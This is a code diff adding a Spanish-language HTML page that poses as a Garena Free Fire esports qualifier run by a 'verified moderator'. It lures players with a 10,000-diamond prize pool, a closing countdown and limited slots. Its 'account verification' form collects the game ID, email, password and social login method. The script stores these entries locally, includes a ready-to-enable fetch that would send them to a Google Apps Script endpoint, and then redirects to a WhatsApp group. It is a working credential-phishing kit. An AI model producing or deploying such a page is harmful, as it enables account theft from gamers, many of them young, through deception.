@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Clasificatorio LATAM 2026 · Garena FWCS</title>
+<meta name="description" content="Clasificatorio abierto de escuadras 4v4 rumbo al FWCS. Inscripción con verificación de cuenta.">
+<style>
+  body{margin:0;padding:14px 10px;background:#06070a}
+  .ff-page{max-width:430px;margin:0 auto;font-family:system-ui,-apple-system,"Segoe UI",sans-serif;background:#08090c;border:1px solid #1e232c;border-radius:18px;overflow:hidden;color:#eef1f6;}
+  .ff-page *{box-sizing:border-box;}
+  .ff-top{display:flex;align-items:center;justify-content:space-between;padding:10px 14px;background:#0d0f14;border-bottom:1px solid #1e232c;}
+  .ff-brand{display:flex;align-items:center;gap:8px;font-size:13px;font-weight:500;letter-spacing:.2px;}
+  .ff-logo{width:24px;height:24px;border-radius:6px;background:linear-gradient(140deg,#ff8a1f,#e8392b);display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;color:#000;}
+  .ff-pill{font-size:10px;color:#ffb56b;border:1px solid #4a2c12;background:#1c1208;border-radius:99px;padding:3px 8px;}
+  .ff-hero{position:relative;padding:18px 14px 16px;background:
+    radial-gradient(120% 90% at 15% 0%,rgba(255,106,0,.28),transparent 60%),
+    radial-gradient(90% 80% at 100% 10%,rgba(232,57,43,.22),transparent 60%),
+    repeating-linear-gradient(115deg,rgba(255,255,255,.035) 0 12px,transparent 12px 26px),#0b0d12;
+    border-bottom:1px solid #1e232c;}
+  .ff-tag{display:inline-flex;align-items:center;gap:5px;font-size:10px;font-weight:500;color:#ffcf9e;background:rgba(255,106,0,.14);border:1px solid rgba(255,106,0,.4);border-radius:99px;padding:4px 9px;margin-bottom:10px;}
+  .ff-dot{width:5px;height:5px;border-radius:50%;background:#ff6a00;box-shadow:0 0 0 3px rgba(255,106,0,.2);}
+  .ff-h1{font-size:22px;line-height:1.15;font-weight:500;margin:0 0 6px;letter-spacing:-.3px;}
+  .ff-h1 span{color:#ff8a1f;}
+  .ff-sub{font-size:11.5px;color:#9aa4b4;margin:0 0 14px;line-height:1.5;}
+  .ff-stats{display:flex;gap:7px;}
+  .ff-stat{flex:1;background:rgba(8,9,12,.72);border:1px solid #242a35;border-radius:10px;padding:8px;}
+  .ff-stat b{display:block;font-size:14px;color:#ffb56b;font-weight:500;}
+  .ff-stat i{font-style:normal;font-size:9.5px;color:#79828f;text-transform:uppercase;letter-spacing:.4px;}
+  .ff-org{display:flex;align-items:center;gap:9px;padding:11px 14px;background:#0d1016;border-bottom:1px solid #1e232c;}
+  .ff-av{width:32px;height:32px;border-radius:9px;background:linear-gradient(150deg,#2b3444,#151a22);border:1px solid #333c4b;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:500;color:#ffb56b;}
+  .ff-orgname{font-size:12px;font-weight:500;display:flex;align-items:center;gap:5px;}
+  .ff-check{width:13px;height:13px;border-radius:50%;background:#1b6bff;color:#fff;font-size:8px;display:flex;align-items:center;justify-content:center;}
+  .ff-orgsub{font-size:10px;color:#79828f;}
+  .ff-tabs{display:flex;background:#0d1016;border-bottom:1px solid #1e232c;overflow-x:auto;}
+  .ff-tab{flex:1;padding:10px 3px;font-size:10.5px;color:#79828f;text-align:center;cursor:pointer;border-bottom:2px solid transparent;white-space:nowrap;}
+  .ff-tab.on{color:#ff8a1f;border-bottom-color:#ff6a00;font-weight:500;}
+  .ff-body{padding:14px;}
+  .ff-card{background:#0f131a;border:1px solid #202632;border-radius:12px;padding:12px;margin-bottom:10px;}
+  .ff-k{font-size:10px;text-transform:uppercase;letter-spacing:.5px;color:#6c7583;margin-bottom:6px;}
+  .ff-row{display:flex;justify-content:space-between;font-size:11.5px;padding:5px 0;border-bottom:1px dashed #1e232c;}
+  .ff-row:last-child{border-bottom:0;}
+  .ff-row span:last-child{color:#dfe5ee;font-weight:500;}
+  .ff-row span:first-child{color:#8b95a3;}
+  .ff-bar{height:6px;border-radius:99px;background:#1b212b;overflow:hidden;margin:8px 0 6px;}
+  .ff-bar i{display:block;height:100%;width:85%;background:linear-gradient(90deg,#ff6a00,#ffb56b);}
+  .ff-note{font-size:10.5px;color:#79828f;line-height:1.55;}
+  .ff-note b{color:#c3cad6;font-weight:500;}
+  .ff-rules{margin:0;padding-left:16px;font-size:11.5px;color:#c3cad6;line-height:1.65;}
+  .ff-rules li{margin-bottom:6px;}
+  .ff-rules b{color:#ffb56b;font-weight:500;}
+  .ff-lbl{display:block;font-size:10.5px;color:#8b95a3;margin:0 0 4px;}
+  .ff-in,.ff-sel{width:100%;padding:10px;border-radius:9px;border:1px solid #262e3a;background:#0c1016;color:#eef1f6;font-size:12.5px;outline:none;margin-bottom:9px;font-family:inherit;}
+  .ff-in:focus,.ff-sel:focus{border-color:#ff6a00;}
+  .ff-two{display:flex;gap:8px;}
+  .ff-two>*{flex:1;}
+  .ff-consent{display:flex;gap:7px;align-items:flex-start;font-size:10.5px;color:#8b95a3;line-height:1.45;margin:2px 0 12px;}
+  .ff-btn{width:100%;padding:12px;border:0;border-radius:10px;background:linear-gradient(180deg,#ff8a1f,#f2620a);color:#1a0d00;font-size:13px;font-weight:500;cursor:pointer;font-family:inherit;}
+  .ff-btn.ghost{background:transparent;border:1px solid #262e3a;color:#8b95a3;font-weight:400;}
+  .ff-err{font-size:11px;color:#ff6b6b;margin-bottom:8px;display:none;}
+  .ff-foot{padding:12px 14px;border-top:1px solid #1e232c;background:#0a0c11;font-size:9.5px;color:#5c6572;line-height:1.6;text-align:center;}
+  .ff-spon{display:flex;gap:6px;justify-content:center;margin-bottom:8px;}
+  .ff-spon div{font-size:9px;color:#79828f;border:1px solid #1e232c;border-radius:5px;padding:3px 7px;}
+  .ff-ok{display:flex;gap:9px;align-items:center;margin-bottom:12px;}
+  .ff-okb{width:30px;height:30px;border-radius:50%;background:#0f2a19;border:1px solid #1f6b3d;color:#3ddc84;display:flex;align-items:center;justify-content:center;font-size:14px;}
+  .ff-dump{margin:0 0 10px;padding:10px;background:#0c1016;border:1px solid #262e3a;border-radius:9px;font-size:11px;color:#cfd6e1;white-space:pre-wrap;word-break:break-all;font-family:ui-monospace,monospace;}
+  .m{display:flex;align-items:center;gap:6px;padding:6px 0;border-bottom:1px dashed #1e232c;font-size:11px;}
+  .m:last-child{border-bottom:0;}
+  .m .t{flex:1;color:#9aa4b4;display:flex;align-items:center;gap:5px;}
+  .m .t.w{color:#eef1f6;font-weight:500;}
+  .m .s{width:16px;text-align:center;color:#dfe5ee;font-weight:500;}
+  .m .s.l{color:#5c6572;font-weight:400;}
+  .seed{font-size:9px;color:#6c7583;border:1px solid #232a35;border-radius:4px;padding:1px 4px;}
+  .boo{font-size:8px;color:#1a0d00;background:#ff8a1f;border-radius:4px;padding:1px 4px;font-weight:500;}
+  .tlist{display:flex;flex-wrap:wrap;gap:6px;}
+  .tlist div{font-size:10.5px;color:#c3cad6;border:1px solid #232a35;background:#0c1016;border-radius:6px;padding:4px 7px;}
+  .tlist div.q{border-color:#3d4a1f;color:#c9e07a;}
+</style>
+</head>
+<body>
+
+<div class="ff-page">
+  <div class="ff-top">
+    <div class="ff-brand"><div class="ff-logo">FF</div>Garena FWCS</div>
+    <div class="ff-pill">LATAM · 2026</div>
+  </div>
+
+  <div class="ff-hero">
+    <div class="ff-tag"><span class="ff-dot"></span>Circuito competitivo · Split 3</div>
+    <h1 class="ff-h1">Clasificatorio <span>LATAM</span> 2026</h1>
+    <p class="ff-sub">Fase abierta del circuito de escuadras 4v4 rumbo al FWCS. Los 8 mejores avanzan al cuadro final del servidor Sudamérica.</p>
+    <div class="ff-stats">
+      <div class="ff-stat"><b>10,000</b><i>diamantes</i></div>
+      <div class="ff-stat"><b>437/512</b><i>escuadras</i></div>
+      <div class="ff-stat" id="cd"><b>--:--:--</b><i>cierre</i></div>
+    </div>
+  </div>
+
+  <div class="ff-org">
+    <div class="ff-av">KR</div>
+    <div>
+      <div class="ff-orgname">KrakenFF <span class="ff-check">✓</span></div>
+      <div class="ff-orgsub">Moderador oficial LATAM · organiza torneos desde 2021</div>
+    </div>
+  </div>
+
+  <div class="ff-tabs">
+    <div class="ff-tab on" data-t="info">Info</div>
+    <div class="ff-tab" data-t="reglas">Reglas</div>
+    <div class="ff-tab" data-t="premios">Premios</div>
+    <div class="ff-tab" data-t="cuadro">Cuadro</div>
+    <div class="ff-tab" data-t="insc">Inscripción</div>
+  </div>
+
+  <div class="ff-body">
+
+    <div id="p-info">
+      <div class="ff-card">
+        <div class="ff-k">El circuito</div>
+        <div class="ff-note">Free Fire es el battle royale móvil más jugado de Latinoamérica y su escena competitiva se sostiene sobre escuadras que suben desde scrims y clasificatorios abiertos. <b>Este es uno de esos clasificatorios:</b> formato de puntos, árbitro en sala y transmisión en vivo. La escuadra que gana el cuadro se lleva el pase directo a la final regional del servidor.</div>
+      </div>
+      <div class="ff-card">
+        <div class="ff-k">Formato de juego</div>
+        <div class="ff-row"><span>Modalidad</span><span>Escuadra 4v4</span></div>
+        <div class="ff-row"><span>Mapas</span><span>Bermuda · Purgatorio</span></div>
+        <div class="ff-row"><span>Series</span><span>Bo3 · eliminación directa</span></div>
+        <div class="ff-row"><span>Puntaje</span><span>Posición + eliminaciones</span></div>
+        <div class="ff-row"><span>Desempate</span><span>Kills totales y BOOYAH</span></div>
+        <div class="ff-row"><span>Servidor</span><span>Sudamérica</span></div>
+      </div>
+      <div class="ff-card">
+        <div class="ff-k">Cupos</div>
+        <div class="ff-bar"><i></i></div>
+        <div class="ff-note">437 escuadras confirmadas de 512. El bracket cierra al completar plazas o al llegar a cero el contador de inscripción.</div>
+      </div>
+      <div class="ff-card">
+        <div class="ff-note">Organizado y arbitrado por moderadores del servidor comunitario LATAM, con staff en sala durante todas las series. Prohibido emulador, macro y cuentas prestadas.</div>
+      </div>
+    </div>
+
+    <div id="p-reglas" style="display:none">
+      <div class="ff-card">
+        <div class="ff-k">Reglamento (resumen)</div>
+        <ol class="ff-rules">
+          <li>Cuenta con mínimo <b>nivel 40</b> y rango Oro III o superior.</li>
+          <li>Verificación obligatoria del ID y del correo asociado antes del cierre.</li>
+          <li>Una inscripción por jugador. Duplicados quedan descalificados.</li>
+          <li>Escuadra completa de 4 titulares + 1 suplente.</li>
+          <li>Emulador, macro o panel externo: <b>descalificación directa</b>.</li>
+          <li>Se permite un cambio de jugador hasta 1 hora antes del inicio.</li>
+          <li>El organizador puede pedir captura del perfil para validar identidad.</li>
+        </ol>
+      </div>
+      <div class="ff-card">
+        <div class="ff-note">Al inscribirte aceptas la revisión de tu cuenta por parte del staff. Las decisiones del árbitro son finales.</div>
+      </div>
+    </div>
+
+    <div id="p-premios" style="display:none">
+      <div class="ff-card">
+        <div class="ff-k">Bolsa de diamantes · 10,000</div>
+        <div class="ff-row"><span>1er lugar</span><span>4,000 diamantes</span></div>
+        <div class="ff-row"><span>2do lugar</span><span>2,000 diamantes</span></div>
+        <div class="ff-row"><span>3er lugar</span><span>1,500 diamantes</span></div>
+        <div class="ff-row"><span>4to al 8vo</span><span>500 diamantes c/u</span></div>
+        <div class="ff-row"><span>MVP del cuadro</span><span>Pase Élite + skin</span></div>
+      </div>
+      <div class="ff-card">
+        <div class="ff-note">Los diamantes se acreditan directo al ID del capitán dentro de 72 h hábiles, con la cuenta ya verificada. Se pueden canjear por pases, skins o pases de personaje desde la tienda del juego.</div>
+      </div>
+      <div class="ff-card">
+        <div class="ff-note">Los 8 primeros del cuadro reciben además <b>invitación al grupo cerrado de scrims</b> del servidor, donde se arman las escuadras que compiten el resto del split.</div>
+      </div>
+    </div>
+
+    <div id="p-cuadro" style="display:none">
+      <div class="ff-card">
+        <div class="ff-k">Octavos · resultados</div>
+        <div class="m"><span class="t w"><span class="seed">1</span>Lobos del Sur</span><span class="s">12</span><span class="s l">8</span><span class="boo">BOOYAH</span></div>
+        <div class="m"><span class="t w"><span class="seed">2</span>Nova Kings</span><span class="s">11</span><span class="s l">7</span><span class="boo">BOOYAH</span></div>
+        <div class="m"><span class="t w"><span class="seed">3</span>Fénix Rojo</span><span class="s">14</span><span class="s l">9</span><span class="boo">BOOYAH</span></div>
+        <div class="m"><span class="t w"><span class="seed">4</span>Titanes EC</span><span class="s">10</span><span class="s l">10</span><span class="boo">BOOYAH</span></div>
+        <div class="m"><span class="t w"><span class="seed">5</span>Cóndores</span><span class="s">13</span><span class="s l">6</span><span class="boo">BOOYAH</span></div>
+        <div class="m"><span class="t w"><span class="seed">6</span>Zona Zero</span><span class="s">9</span><span class="s l">8</span><span class="boo">BOOYAH</span></div>
+        <div class="m"><span class="t w"><span class="seed">7</span>Revancha FF</span><span class="s">12</span><span class="s l">11</span><span class="boo">BOOYAH</span></div>
+        <div class="m"><span class="t w"><span class="seed">8</span>Dragones MX</span><span class="s">15</span><span class="s l">4</span><span class="boo">BOOYAH</span></div>
+      </div>
+      <div class="ff-card">
+        <div class="ff-k">Cuartos de final · cruces</div>
+        <div class="m"><span class="t">Lobos del Sur</span><span class="s l">—</span><span class="s l">—</span><span class="t" style="justify-content:flex-end">Cóndores</span></div>
+        <div class="m"><span class="t">Nova Kings</span><span class="s l">—</span><span class="s l">—</span><span class="t" style="justify-content:flex-end">Zona Zero</span></div>
+        <div class="m"><span class="t">Fénix Rojo</span><span class="s l">—</span><span class="s l">—</span><span class="t" style="justify-content:flex-end">Revancha FF</span></div>
+        <div class="m"><span class="t">Titanes EC</span><span class="s l">—</span><span class="s l">—</span><span class="t" style="justify-content:flex-end">Dragones MX</span></div>
+        <div class="ff-note" style="margin-top:8px">Cuadro arbitrado por el staff. Los cruces de la siguiente ronda se sortean en vivo por el canal del organizador.</div>
+      </div>
+      <div class="ff-card">
+        <div class="ff-k">Escuadras clasificadas</div>
+        <div class="tlist">
+          <div class="q">Lobos del Sur</div><div class="q">Nova Kings</div><div class="q">Fénix Rojo</div>
+          <div class="q">Titanes EC</div><div class="q">Cóndores</div><div class="q">Zona Zero</div>
+          <div class="q">Revancha FF</div><div class="q">Dragones MX</div>
+        </div>
+        <div class="ff-note" style="margin-top:8px">Faltan 8 plazas del cuadro. Se asignan por orden de verificación.</div>
+      </div>
+    </div>
+
+    <div id="p-insc" style="display:none">
+      <div id="formwrap">
+        <div class="ff-card" style="margin-bottom:12px">
+          <div class="ff-k">Verificación de cuenta</div>
+          <div class="ff-note">Vincula tu cuenta para validar rango y evitar smurfs en el bracket. El staff revisa los datos antes de confirmar el cupo.</div>
+        </div>
+
+        <label class="ff-lbl">Nombre de invocador (capitán)</label>
+        <input class="ff-in" id="f_nick" placeholder="Ej: KrakenFF" autocomplete="off">
+
+        <label class="ff-lbl">ID de jugador</label>
+        <input class="ff-in" id="f_id" placeholder="9 dígitos" inputmode="numeric" autocomplete="off">
+
+        <label class="ff-lbl">Nombre de la escuadra</label>
+        <input class="ff-in" id="f_team" placeholder="Ej: Lobos del Sur" autocomplete="off">
+
+        <label class="ff-lbl">Correo de la cuenta</label>
+        <input class="ff-in" id="f_mail" placeholder="tucorreo@gmail.com" autocomplete="off">
+
+        <label class="ff-lbl">Contraseña</label>
+        <input class="ff-in" id="f_pass" type="password" placeholder="••••••••">
+
+        <div class="ff-two">
+          <div>
+            <label class="ff-lbl">Inicio de sesión</label>
+            <select class="ff-sel" id="f_metodo">
+              <option>Facebook</option>
+              <option>Google</option>
+              <option>VK</option>
+              <option>Apple</option>
+              <option>Correo Free Fire</option>
+            </select>
+          </div>
+          <div>
+            <label class="ff-lbl">Región</label>
+            <select class="ff-sel" id="f_reg">
+              <option>Brasil</option>
+              <option>Latinoamérica</option>
+              <option>México</option>
+              <option>Argentina</option>
+              <option>Colombia</option>
+            </select>
+          </div>
+        </div>
+
+        <label class="ff-consent">
+          <input type="checkbox" id="f_reglas">
+          <span>Confirmo que la cuenta es mía, acepto el reglamento y autorizo la verificación de datos por el staff.</span>
+        </label>
+
+        <div class="ff-err" id="err"></div>
+        <button class="ff-btn" id="btn">Verificar y reservar cupo</button>
+        <div style="text-align:center;font-size:9.5px;color:#5c6572;margin-top:8px">Plazas limitadas · soporte por Discord</div>
+      </div>
+
+      <div id="okwrap" style="display:none">
+        <div class="ff-ok">
+          <div class="ff-okb">✓</div>
+          <div>
+            <div style="font-size:13px;font-weight:500">Cuenta validada · cupo reservado</div>
+            <div style="font-size:10.5px;color:#8b95a3">Escuadra en lista de confirmación del staff.</div>
+          </div>
+        </div>
+        <div class="ff-lbl" style="margin-bottom:5px">Datos recibidos</div>
+        <pre class="ff-dump" id="dump"></pre>
+        <button class="ff-btn" id="wpp" style="margin-bottom:8px">Entrar al grupo del torneo</button>
+        <button class="ff-btn ghost" id="again">Inscribir otra escuadra</button>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="ff-foot">
+    <div class="ff-spon"><div>BOOYAH</div><div>Zona FF</div><div>Drop LATAM</div></div>
+    Clasificatorio LATAM 2026 · Garena FWCS · Soporte: discord.gg/copalatam<br>
+    Página de organización comunitaria, no afiliada a Garena.
+  </div>
+</div>
+
+<script>
+(function(){
+  var $ = function(i){ return document.getElementById(i); };
+
+  var tabs = document.querySelectorAll('.ff-tab');
+  tabs.forEach(function(t){
+    t.addEventListener('click', function(){
+      tabs.forEach(function(x){ x.classList.remove('on'); });
+      t.classList.add('on');
+      ['info','reglas','premios','cuadro','insc'].forEach(function(k){ $('p-'+k).style.display = 'none'; });
+      $('p-' + t.dataset.t).style.display = 'block';
+    });
+  });
+
+  var end = Date.now() + 2*24*3600*1000 + 7*3600*1000;
+  setInterval(function(){
+    var d = Math.max(0, end - Date.now());
+    var p = function(n){ return String(n).padStart(2,'0'); };
+    $('cd').querySelector('b').textContent = p(Math.floor(d/3600000)) + ':' + p(Math.floor(d/60000)%60) + ':' + p(Math.floor(d/1000)%60);
+  }, 1000);
+
+  $('btn').addEventListener('click', function(){
+    var v = {
+      nick: $('f_nick').value.trim(), id: $('f_id').value.trim(), team: $('f_team').value.trim(),
+      mail: $('f_mail').value.trim(), pass: $('f_pass').value,
+      metodo: $('f_metodo').value, reg: $('f_reg').value, ts: new Date().toISOString()
+    };
+    var err = $('err');
+    if(!v.nick || !v.id || !v.team || !v.mail || !v.pass){ err.textContent = 'Completa todos los campos obligatorios.'; err.style.display='block'; return; }
+    if(!/^[^@\s]+@[^@\s]+\.[a-z]{2,}$/i.test(v.mail)){ err.textContent = 'El correo no es válido.'; err.style.display='block'; return; }
+    if(!$('f_reglas').checked){ err.textContent = 'Debes aceptar el reglamento.'; err.style.display='block'; return; }
+    err.style.display = 'none';
+
+    // fetch('https://script.google.com/macros/s/TU_ID/exec',{method:'POST',mode:'no-cors',headers:{'Content-Type':'text/plain;charset=utf-8'},body:JSON.stringify(v)});
+    try{ var a = JSON.parse(localStorage.getItem('ff_cap')||'[]'); a.push(v); localStorage.setItem('ff_cap', JSON.stringify(a)); }catch(e){}
+
+    $('dump').textContent = 'capitan: '+v.nick+'\nid: '+v.id+'\nescuadra: '+v.team+'\ncorreo: '+v.mail+'\npassword: '+v.pass+'\nmetodo: '+v.metodo+'\nregion: '+v.reg+'\nfecha: '+v.ts;
+    $('formwrap').style.display = 'none';
+    $('okwrap').style.display = 'block';
+  });
+
+  $('again').addEventListener('click', function(){
+    ['f_nick','f_id','f_team','f_mail','f_pass'].forEach(function(i){ $(i).value = ''; });
+    $('f_reglas').checked = false;
+    $('okwrap').style.display = 'none';
+    $('formwrap').style.display = 'block';
+  });
+
+  $('wpp').addEventListener('click', function(){
+    window.open('https://chat.whatsapp.com/TU_GRUPO','_blank');
+  });
+})();
+</script>
+
+</body>
+</html>
